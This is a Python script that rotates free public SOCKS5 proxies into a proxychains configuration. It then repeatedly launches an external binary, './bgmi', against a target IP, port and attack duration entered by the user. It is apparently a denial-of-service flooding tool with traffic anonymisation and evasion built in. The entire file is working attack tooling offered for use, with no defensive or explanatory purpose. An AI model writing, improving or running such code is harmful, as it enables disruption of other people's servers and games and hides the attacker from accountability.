import requests
import os
import time
import random
import socket

ROTATE_INTERVAL = 120  # seconds between proxy rotations
PROXY_SOURCE_URL = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"
PROXYCHAINS_CONF_PATH = os.path.expanduser("~/.proxychains/proxychains.conf")
NUM_PROXIES = 10  # Number of working proxies to use

def fetch_proxies():
    try:
        print("[*] Fetching fresh proxy list...")
        r = requests.get(PROXY_SOURCE_URL)
        return r.text.strip().splitlines()
    except Exception as e:
        print("[!] Failed to fetch proxies:", e)
        return []

def test_proxy(ip, port, timeout=3):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        s.close()
        return True
    except:
        return False

def validate_proxies(proxy_list):
    print(f"[*] Validating top {NUM_PROXIES * 2} proxies...")
    valid = []
    for proxy in proxy_list[:NUM_PROXIES * 2]:  # test first N*2 to find N good ones
        ip, port = proxy.split(":")
        if test_proxy(ip, port):
            print(f"[+] Valid proxy: {ip}:{port}")
            valid.append((ip, port))
        if len(valid) >= NUM_PROXIES:
            break
    print(f"[✓] Using {len(valid)} working proxies.")
    return valid

def update_proxychains_conf(valid_proxies):
    print(f"[*] Writing {len(valid_proxies)} proxies to proxychains.conf...")
    config = """strict_chain
proxy_dns 
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
"""
    for ip, port in valid_proxies:
        config += f"socks5 {ip} {port}\n"

    os.makedirs(os.path.dirname(PROXYCHAINS_CONF_PATH), exist_ok=True)
    with open(PROXYCHAINS_CONF_PATH, "w") as f:
        f.write(config)
    print(f"[✓] Updated: {PROXYCHAINS_CONF_PATH}")

def rotate_proxies():
    proxies = fetch_proxies()
    valid = validate_proxies(proxies)
    if valid:
        update_proxychains_conf(valid)
    else:
        print("[!] No valid proxies found. Skipping update.")

def run_bgmi(ip, port, attack_time):
    cmd = f"proxychains ./bgmi {ip} {port} {attack_time}"
    print(f"[*] Launching: {cmd}")
    os.system(cmd)

if __name__ == "__main__":
    target_ip = input("Enter Target IP: ").strip()
    target_port = input("Enter Target Port: ").strip()
    attack_time = input("Enter Attack Time (seconds): ").strip()
    

    while True:
        rotate_proxies()
        run_bgmi(target_ip, target_port, attack_time)
        print(f"[*] Sleeping {ROTATE_INTERVAL} seconds before next round...\n")
        time.sleep(ROTATE_INTERVAL)
